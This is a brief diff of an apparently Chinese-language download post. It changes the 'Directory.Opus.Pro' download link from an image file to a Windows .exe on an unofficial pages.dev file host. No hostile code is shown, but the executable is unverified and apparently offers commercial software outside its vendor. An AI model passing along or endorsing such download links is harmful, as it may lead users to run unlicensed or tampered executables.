@@ -13,5 +13,5 @@ image:
 
 ![20260706-103945.webp](https://katelya-tgbed-3d9.pages.dev/file/hf:hf_1789612861554_hwm7wz.webp)
 
-1、点击下方下载
-[Directory.Opus.Pro](https://katelya-tgbed-3d9.pages.dev/file/github:github_1788335297939_sy3hbd.webp)  
+1、点击下方下载  
+[Directory.Opus.Pro](https://katelya-tgbed-3d9.pages.dev/file/hf:hf_1789612088352_06q4sf.exe)  
